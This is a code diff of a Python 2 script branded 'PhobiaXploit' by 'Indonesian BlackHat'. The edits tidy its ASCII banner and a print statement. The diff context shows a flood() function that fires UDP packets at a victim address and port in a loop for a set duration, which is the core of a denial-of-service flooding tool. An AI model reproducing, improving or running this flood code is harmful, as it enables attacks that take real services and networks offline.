@@ -50,13 +50,13 @@ class colors:
 
 def usage():
     print \
-   bcolors.IJO + 
-"""
+   bcolors.IJO + """
 \033[94m ____  _           _     _      __  __      _       _ _
 \033[92m|  _ \| |__   ___ | |__ (_) __ _\ \/ /_ __ | | ___ (_) |_
 \033[31m|  __/| | | | (_) | |_) | | (_| |/  \| |_) | | (_) | | |_
 \033[93m|_|   |_| |_|\___/|_.__/|_|\__,_/_/\_\ .__/|_|\___/|_|\__|
-                        \033[92m-------------------------------\033[1m\033[31m\033[4mIndonesian BlackHat\033[0m------------------------------
+                                     |_|
+\033[92m-------------------------------\033[1m\033[31m\033[4mIndonesian BlackHat\033[0m------------------------------
 
                                   \033[1m\033[93mAuthor:\033[91m\033[31m\033[1m./Tsuki\033[31m
 
@@ -81,15 +81,14 @@ def flood(korbanmu, vport, durasi):
     timeout =  time.time() + durasi
     sent = 50000
 
-    while 1 : 
+    while 1:
         if time.time() > timeout:
             break
         else:
             pass
-
         client.sendto(bytes, (korbanmu, vport))
         sent = sent + 1
-        print + "[\033[94m*\033[95m]SYS[\033[92m%s\033[95m] UDP [\033[91m%s\033[0m] PORT [\033[91m%s\033[4m\033[94m proxy \033[91m]" %(sent, korbanmu, vport)
+        print bcolors.HEADER + "[\033[94m*\033[95m]SYS[\033[92m%s\033[95m] UDP [\033[91m%s\033[0m] PORT [\033[91m%s\033[4m\033[94m proxy \033[91m]" %(sent, korbanmu, vport)
 	
 def main():
     print len(sys.argv)
